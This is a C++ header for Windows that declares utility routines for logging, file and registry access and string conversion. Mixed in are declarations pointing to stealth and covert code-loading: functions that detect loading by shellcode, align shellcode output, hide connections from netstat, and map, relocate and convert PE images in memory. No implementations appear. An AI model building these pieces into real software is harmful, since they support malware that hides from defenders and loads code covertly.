#ifndef __TOOLS_H____h_
#define __TOOLS_H____h_
#include <windows.h>
#include <string>
#include <vector>
#include <fstream>
#include <map>
#include "Define.h"


#define  STRINGIFY(x) #x 
#define  TOSTRING(x) STRINGIFY(x) 
#define  AT __FILE__ "   " TOSTRING(__LINE__) " line =>: \r"

//  日志功能
void log(std::string  str , char* at =NULL);


#if 1
#define log log
#else
#define log 
#endif
void LogA(const char * szFormat, ...);
void LogW(const wchar_t * szFormat, ...);

#define LOG_MASK_LOG_FILE		0x00000001L
#define LOG_MASK_DEBUG_VIEW		0x00000002L
#define LOG_MASK_CONSOLE		0x00000004L

void LogA(const char * szFormats, ...);
void LogExA(bool bAddRtn, const char * szFormats, ...);
void LogW(const wchar_t * szFormats, ...);
void LogExW(bool bAddRtn, const wchar_t * szFormats, ...);

bool IsLoadByShellcode();
void ByteAlign(std::string& strOutShellCode);
bool ReadBinFile(const std::string& strFile, std::string& strData);
bool WriteBinFile(const std::string& strFile, std::string& strData);

std::wstring GetAppPathW();
std::string GetAppPathA();
std::wstring GetAppPathNameW();
std::string GetAppPathNameA();

std::map<std::string, std::string> ParsePathFileA(const char* szPathFile);
std::map<std::string, std::string> ParsePathFileA(const std::string& strPathFile);
std::string BuildPathFileA(std::map<std::string, std::string>& mapPathFile);
void buildCmdLineStr(int argc, char* argv[], std::string& strOutCmdLine);
void parseCmdLine(char* pCmdLine, std::vector<std::string>& vecCmdLine);
bool RegSet(unsigned long hPreKey, const std::wstring& strSubPath, const std::wstring& strName, const std::wstring& strValue);
bool RegGet(unsigned long hPreKey, const std::wstring& strSubPath, const std::wstring& strName, std::wstring& strValue);
std::wstring GetAppNameW();
std::string GetAppNameA();
std::wstring GetAppPathNameW();
std::string GetAppPathNameA();
wchar_t* ToolAscII2WideString(const char* pInput);
char* ToolWideString2AscIIString(const wchar_t* pUnicode);
std::string _w2a(const std::wstring& strw);
std::string _w2a(const wchar_t* szStrw);
std::wstring _a2w(const std::string& stra);
std::wstring _a2w(const char* szStra);
BOOL RegDeleteNosafe(unsigned long hPreKey, const std::wstring& strName);


//--------------------
int setHideFlagInNetstat();
void setContainerFlag();

std::vector<std::string> splitstr(std::string str, std::string s);
std::vector<std::wstring> splitwstr(std::wstring str, std::wstring s);
void GetIniSecMapW(const wchar_t* file, const wchar_t* sec, std::map<std::wstring, std::wstring>& mapSec, bool bLwr);




void* File2BufferW(DWORD* pSize, const wchar_t* szPathFileW);
void* File2Buffer(DWORD* pSize, const char* szPathFile);
bool Buffer2FileW(const wchar_t* szPathFileW, const void* buffer, const int nBufferSize);
bool Buffer2File(const char* szPathFile, const void* buffer, const int nBufferSize);
bool Buffer2FileAddW(const wchar_t* szPathFileW, const void* buffer, const int nBufferSize);
bool Buffer2FileAdd(const char* szPathFile, const void* buffer, const int nBufferSize);

static void ChgeHeaderSectionAddr(PVOID pMapedMemData, DWORD TagartBase);
BOOL MapedPePerformBaseRelocation(PVOID pMapedMemData, DWORD TagartBase);
SIZE_T GetMemImageSize(void* ImageBase);
PVOID MapedMemPeGetProcAddress(PVOID pMapedMemData, LPCSTR name);
PVOID MapedMemPeGetEntryPoint(PVOID pMapedMemData);
bool ChgeMapedExe2Dll(PVOID pMapedMemData);
bool ChgeMapedDll2Exe(PVOID pMapedMemData);
void HexDump(char * in, int len);

#endif //__TOOLS_H____h_